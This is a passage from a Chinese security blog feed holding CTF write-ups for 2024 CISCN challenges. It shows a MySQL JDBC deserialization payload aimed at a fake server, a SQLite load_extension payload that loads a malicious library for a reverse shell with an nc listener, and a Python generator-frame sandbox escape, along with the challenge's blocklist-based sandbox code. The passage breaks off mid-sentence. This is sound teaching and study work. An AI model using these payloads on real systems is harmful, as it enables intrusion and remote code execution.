href="https://xz.aliyun.com/news/7754">MySQL JDBC 反序列化漏洞分析</a></p><p>这里用工具<code>Fake Server</code>来制作虚假服务，链接：<a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p><p>把上面执行得到的序列化数据写入Gadget，如图所示，按顺序执行</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104150159897.png"></p><p>ip这里要说下，由于一般本地电脑是没有公网ip的，你写自己的电脑ip进去是不行的，那怎么办，建议最好有个服务器吧，在服务器部署frp服务，然后内网穿透进行反向代理，可以参考文章<a href="https://blog.csdn.net/weixin_46263867/article/details/149537197?spm=1001.2014.3001.5502">内网穿透神器FRP部署教程</a>，快的话十几分钟就可以，或者你买个短期的静态ip地址来用</p><p>我这里用frp进行反向代理连接我本地的端口</p><p>弄完之后，点击<code>Copy Payload</code>复制payload，然后重新打开题目网页选择Mysql随便输入内容抓个包，看看格式</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104152542399.png"></p><p>把里面的url改成我们刚才复制的payload，然后发包</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:mysql://ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=base64ZGVzZXJfQ1VTVE9N&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>获得如下结果就说明成功了</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104152943753.png"></p><h3 id="SQLite-JDBC加载恶意动态链接库"><a href="#SQLite-JDBC加载恶意动态链接库" class="headerlink" title="SQLite JDBC加载恶意动态链接库"></a>SQLite JDBC加载恶意动态链接库</h3><p>最后就是通过SQLite加载恶意文件</p><p>可以参考文章：<a href="https://gitcode.com/gh_mirrors/ja/JavaSec/blob/main/9.JDBC%20Attack/SQLite/index.md?utm_source=csdn_blog_hover">SQLite With SSRF</a></p><p>先在服务器开启nc监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure><p>然后构造payload发包，由于<code>load_extension</code>默认是关闭的，需要<code>enable_load_extension=true</code>开启才能用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span><span class="string">&quot;(select(load_extension(\&quot;/tmp/evil.so\&quot;)));&quot;</span><span class="punctuation">,</span><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:sqlite:file:/tmp/db?enable_load_extension=true&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>成功反弹shell</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104153549961.png"></p><p>读取flag文件发现权限不够，<code>ls -l</code>查看权限，发现flag没有执行权限，但是readflag存在执行权限，直接执行获取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104153655376.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题用到了很多知识点，包括AspectJWeaver反序列化、MySQL JDBC反序列化和SQLite SSRF等，总体来说有些难度，也是参考了很多资料，建议深入学习这些知识点，尤其是JDBC方面的漏洞和Java反射机制，做题做下来感觉基础很重要，学好了做这种题就会轻松很多，与君共勉，继续加油！！</p>]]></content>
    
    
    <summary type="html">2024CISCN ezjava复现分析</summary>
    
    
    
    <category term="Java安全" scheme="https://waynejoon.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="https://waynejoon.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python栈帧沙箱逃逸</title>
    <link href="https://waynejoon.github.io/posts/Python-Stack-Frame-Sandbox-Escape/"/>
    <id>https://waynejoon.github.io/posts/Python-Stack-Frame-Sandbox-Escape/</id>
    <published>2025-10-30T14:12:29.000Z</published>
    <updated>2025-10-30T14:26:07.133Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="什么是生成器"><a href="#什么是生成器" class="headerlink" title="什么是生成器"></a>什么是生成器</h3><p>生成器（Generator）是Python中一种特殊的迭代器，它通过函数和表达式来创建，可以逐个产生值，并在每次生成一个值后暂停执行，保留当前状态，以便下一次调用时能够从暂停的地方继续执行</p><p>生成器函数使用<code>yield</code>语句生成值，而不是普通函数的<code>return</code>，调用生成器函数返回的是一个生成器对象，每次调用该对象的<code>next()</code>方法时，生成器函数会从上次暂停的位置继续执行，直到遇到下一个<code>yield</code>或函数结束</p><p>举个简单的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">g = generator()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(g))  <span class="comment"># 输出1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(g))  <span class="comment"># 输出2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(g))  <span class="comment"># 输出3</span></span><br></pre></td></tr></table></figure><h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>为了更方便的书写，我们可以用生成器表达式，这是Python中创建生成器对象的一种简洁语法，形式类似列表推导式，但用的是圆括号()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)) </span><br><span class="line"><span class="built_in">print</span>(g)  <span class="comment"># 输出&lt;generator object &lt;genexpr&gt; at 0x0000025FF5AA5B40&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>next()</code>方法来逐步执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">g = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(g))  <span class="comment"># 输出0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(g))  <span class="comment"># 输出1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果一直逐步执行的话太麻烦了，我们可以用循环来执行，有很多方法，这里列举几个常用的</p><p><strong>for循环遍历生成器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> g:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br></pre></td></tr></table></figure><p><strong>列表推导式</strong>循环创建列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>([ i <span class="keyword">for</span> i <span class="keyword">in</span> g ])  <span class="comment"># [0, 1, 2]</span></span><br></pre></td></tr></table></figure><p><strong>解包操作</strong>构造列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g = (i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>([*g])  <span class="comment"># [0, 1, 2]</span></span><br></pre></td></tr></table></figure><h3 id="生成器属性"><a href="#生成器属性" class="headerlink" title="生成器属性"></a>生成器属性</h3><p>生成器的常用属性主要包括：</p><p><code>gi_code</code>：生成器对应的代码对象，包含生成器函数的字节码和相关信息</p><p><code>gi_frame</code>：生成器当前运行的帧对象（当前执行的位置、局部变量等）</p><p><code>gi_running</code>：表示生成器是否正在执行，True表示运行中，False表示空闲，例如<code>next(g)</code>执行的时候是True，执行前、执行后都是False</p><p><code>gi_yieldfrom</code>：当前生成器遇到的 yield from 语句引用的子生成器对象</p><p><code>gi_frame.f_locals</code>：可以访问生成器当前帧的局部变量字典</p><p>其中用的比较多的是<code>gi_frame</code>，它指向该生成器当前执行的栈帧对象，用于保存该生成器函数在执行过程中的上下文信息。可以理解为函数执行的“快照”，包括当前执行到了哪条指令、局部变量、全局变量等</p><p>举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">g = gen()</span><br><span class="line"><span class="built_in">print</span>(g.gi_code)       <span class="comment"># &lt;code object gen at 0x0000017A385FBB40, file &quot;/z3.py&quot;, line 1&gt;</span></span><br><span class="line"><span class="built_in">print</span>(g.gi_frame)      <span class="comment"># &lt;frame at 0x0000017A385B6A30, file &#x27;/z3.py&#x27;, line 1, code gen&gt;</span></span><br><span class="line"><span class="built_in">print</span>(g.gi_running)    <span class="comment"># False</span></span><br></pre></td></tr></table></figure><h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p>Python中，栈帧是运行时管理函数调用和执行状态的关键数据结构。它包含了函数执行时的所有重要信息，如当前执行位置、局部变量、参数、返回地址等，<strong>任何函数调用都会创建一个栈帧，函数退出时栈帧销毁</strong></p><p>栈帧包含以下重要属性</p><p><code>f_locals</code>：局部变量字典，可以查看和修改生成器当前帧的局部变量</p><p><code>f_globals</code>：全局变量字典，存储当前模块的全局变量</p><p><code>f_code</code>：代码对象，包含字节码指令等函数定义信息</p><p><code>f_lasti</code>：当前执行的指令索引，指示执行到了哪条字节码指令</p><p><code>f_back</code>：指向上一级调用栈帧，可用于追踪调用链</p><p>获取栈帧的方式同样也很多</p><p><strong>sys._getframe()</strong></p><p><code>sys._getframe()</code>函数用于获取当前或指定深度的栈帧，语法是<code>sys._getframe([depth])</code>，<code>depth</code>是可选参数，表示从当前调用帧起向上追溯的层数，0表示当前帧，1表示上一个调用帧，以此类推</p><p>举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">depth=<span class="number">0</span></span>):</span><br><span class="line">    frame = sys._getframe()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(depth):</span><br><span class="line">        frame = frame.f_back</span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(foo(<span class="number">0</span>))  <span class="comment"># 当前帧，&lt;frame at 0x0000024CF2CAA9B0, file &#x27;/z3.py&#x27;, line 7, code foo&gt;</span></span><br><span class="line"><span class="built_in">print</span>(foo(<span class="number">1</span>))  <span class="comment"># 上一帧，&lt;frame at 0x0000024CF2C05B40, file &#x27;/z3.py&#x27;, line 10, code &lt;module&gt;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(foo(<span class="number">2</span>))<span class="comment"># 再上一帧，None</span></span><br></pre></td></tr></table></figure><p><strong>inspect模块的currentframe()</strong></p><p><code>inspect.currentframe()</code>返回当前调用的栈帧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    frame = inspect.currentframe()</span><br><span class="line">    <span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">foo()</span><br><span class="line"><span class="comment"># &lt;frame at 0x000002A5C9216EC0, file &#x27;/z3.py&#x27;, line 5, code foo&gt;</span></span><br></pre></td></tr></table></figure><p><strong>通过生成器的gi_frame属性</strong></p><p>生成器对象保存当前执行的栈帧，可直接访问<code>gi_frame</code>，查看执行状态和局部变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line">f = foo()</span><br><span class="line"><span class="built_in">print</span>(f.gi_frame)</span><br><span class="line"><span class="comment"># &lt;frame at 0x000001DFE2355DD0, file &#x27;/z3.py&#x27;, line 1, code foo&gt;</span></span><br></pre></td></tr></table></figure><p>我们需要重点掌握的就是栈帧回溯，后续我们的栈帧沙箱逃逸就是基于此进行</p><p>举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">f1 = sys._getframe()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    f2 = sys._getframe()</span><br><span class="line">    <span class="built_in">print</span>(f2.f_back <span class="keyword">is</span> f1)  <span class="comment"># True</span></span><br><span class="line">    <span class="built_in">print</span>(f2)  <span class="comment"># &lt;frame at 0x000001F13D735A80, file &#x27;/z3.py&#x27;, line 7, code func&gt;</span></span><br><span class="line">    <span class="built_in">print</span>(f2.f_back)  <span class="comment"># &lt;frame at 0x000001F13D745DD0, file &#x27;/z3.py&#x27;, line 10, code &lt;module&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">func()</span><br><span class="line"><span class="built_in">print</span>(f1)  <span class="comment"># &lt;frame at 0x000001F13D745DD0, file &#x27;/z3.py&#x27;, line 11, code &lt;module&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，<code>f2.f_back</code>对应的帧地址和<code>f1</code>相同，均为<code>0x000001F13D745DD0</code></p><h2 id="利用栈帧进行沙箱逃逸"><a href="#利用栈帧进行沙箱逃逸" class="headerlink" title="利用栈帧进行沙箱逃逸"></a>利用栈帧进行沙箱逃逸</h2><p>一般情况下这种题目的逻辑是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;this is flag&quot;</span></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;接受用户输入代码&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 过滤</span></span><br><span class="line">compiled_code = <span class="built_in">compile</span>(code)</span><br><span class="line"><span class="comment"># 过滤</span></span><br><span class="line"><span class="built_in">exec</span>(</span><br><span class="line">    compiled_code,</span><br><span class="line">    <span class="literal">None</span>,   <span class="comment"># globals</span></span><br><span class="line">    <span class="literal">None</span>    <span class="comment"># locals</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>通过对用户输入的数据进行过滤，导致很多方法无法使用，这时候可以利用栈帧进行沙箱逃逸，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q = (q.gi_frame.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">g = [*q][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>生成器在创建时会生成栈帧，第一个<code>f_back</code>跳出生成器，第二个<code>f_back</code>跳出<code>exec</code>包围圈，最后调用<code>f_globals</code>获取全局<code>globals</code></p><p>前面我们讲到获取栈帧的方法还有<code>sys._getframe()</code>函数和<code>inspect</code>模块的<code>currentframe()</code>，但这两个由于需要<code>import</code>外部模块，<code>import</code>本身以及<code>sys</code>、<code>inspect</code>可能都被禁用了，所以就用<code>gi_frame</code>来获取栈帧</p><p>运行生成器的话你可以不用解包操作，用列表推导式或循环遍历都可以，具体情况视题目而定。至于为什么<code>next()</code>不可以呢，因为<code>next</code>属于<code>builtins</code>模块，<code>builtins</code>一般都被禁用了</p><p><img src="https://oss.waynejoons.icu/picphoto/20251029214531830.png"></p><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><h3 id="2024CISCN-mossfern"><a href="#2024CISCN-mossfern" class="headerlink" title="2024CISCN mossfern"></a>2024CISCN mossfern</h3><p>这道题是关于Python栈帧沙箱逃逸，我们用ctfshow的环境来复现</p><p>首先下载源码进行分析，可以看到存在路由<code>/run</code>且通过Json来传输数据</p><p><img src="https://oss.waynejoons.icu/picphoto/20251030173731837.png"></p><p>然后传入的数据被送到<code>runner.py</code>进行过滤，随后进行<code>exec</code>执行代码，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><p><code>runner.py</code>构建了一个多层沙箱来执行用户代码，简单解释一下：</p><p><strong>静态字符串检测</strong> (<code>source_simple_check</code>): 检查源码是否包含<code>__</code>、<code>getattr</code>、<code>exit</code>等字符串（不区分大小写）</p><p><strong>字节码检测</strong> (<code>source_opcode_checker</code>): 检查代码编译后的字节码，禁止了<code>LOAD_GLOBAL</code>、<code>IMPORT_NAME</code>、<code>LOAD_METHOD</code>等操作码，但白名单允许<code>randint</code>、<code>randrange</code>、<code>print</code>、<code>seed</code>这几个函数的使用</p><p><strong>运行时审计</strong> (<code>block_wrapper</code>): 